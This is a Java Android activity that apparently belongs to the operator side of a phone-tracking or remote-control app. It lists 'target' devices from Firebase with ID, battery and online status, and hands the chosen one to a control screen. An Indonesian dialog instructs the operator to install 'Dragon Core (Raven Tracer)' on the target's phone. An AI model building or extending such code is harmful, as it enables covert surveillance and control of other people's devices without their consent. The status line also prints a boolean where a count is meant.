package com.paragon.control;

import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class TargetListActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private LinearLayout targetContainer;
    private Button btnBack;
    private TextView tvStatusTarget;
    private ValueEventListener targetListener;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_target_list);

        targetContainer = findViewById(R.id.targetContainer);
        btnBack = findViewById(R.id.btnBack);
        tvStatusTarget = findViewById(R.id.tvStatusTarget);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");

        btnBack.setOnClickListener(v -> finish());

        checkTargets();
    }

    private void checkTargets() {
        targetListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                targetContainer.removeAllViews();
                boolean hasOnlineTarget = false;
                boolean anyTarget = false;

                for (DataSnapshot child : snapshot.getChildren()) {
                    String key = child.getKey();
                    if (key == null || key.equals("serverUrl")) continue;

                    String deviceName = child.child("deviceName").getValue(String.class);
                    String deviceId = child.child("deviceId").getValue(String.class);
                    Integer battery = child.child("battery").getValue(Integer.class);
                    Boolean online = child.child("online").getValue(Boolean.class);

                    if (deviceName == null || deviceId == null) continue;
                    anyTarget = true;

                    if (online != null && online) {
                        hasOnlineTarget = true;
                        addTargetItem(deviceName, deviceId, battery != null ? battery : 0, true, key);
                    }
                }

                if (!anyTarget) {
                    showDialogNoTarget();
                    return;
                }

                if (!hasOnlineTarget) {
                    tvStatusTarget.setText("⚠️ Semua target offline");
                    tvStatusTarget.setTextColor(getColor(R.color.red));
                    return;
                }

                tvStatusTarget.setText("✅ " + hasOnlineTarget + " target online");
                tvStatusTarget.setTextColor(getColor(R.color.primary));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(TargetListActivity.this, "❌ Gagal memuat data", Toast.LENGTH_SHORT).show();
            }
        };

        mDatabase.addValueEventListener(targetListener);
    }

    private void addTargetItem(String deviceName, String deviceId, int battery, boolean online, String targetId) {
        View item = getLayoutInflater().inflate(R.layout.item_target, null);

        TextView tvName = item.findViewById(R.id.tvTargetName);
        TextView tvDevice = item.findViewById(R.id.tvTargetDevice);
        TextView tvStatus = item.findViewById(R.id.tvTargetStatus);
        TextView tvBattery = item.findViewById(R.id.tvTargetBattery);

        tvName.setText(deviceName);
        tvDevice.setText("ID: " + deviceId);
        tvStatus.setText(online ? "🟢 ONLINE" : "🔴 OFFLINE");
        tvStatus.setTextColor(online ? getColor(R.color.primary) : getColor(R.color.red));
        tvBattery.setText(battery + "%");

        item.setOnClickListener(v -> {
            Intent intent = new Intent(TargetListActivity.this, ControlActivity.class);
            intent.putExtra("targetId", targetId);
            intent.putExtra("targetName", deviceName);
            startActivity(intent);
        });

        targetContainer.addView(item);
    }

    private void showDialogNoTarget() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🐉 Belum Ada Target Terhubung");
        builder.setMessage("Install Dragon Core (Raven Tracer) di HP target dan login.");
        builder.setPositiveButton("🔥 REFRESH", (dialog, which) -> {
            checkTargets();
        });
        builder.setNegativeButton("🐉 TUTUP", null);
        builder.setCancelable(false);
        builder.show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (targetListener != null) {
            mDatabase.removeEventListener(targetListener);
        }
    }
}
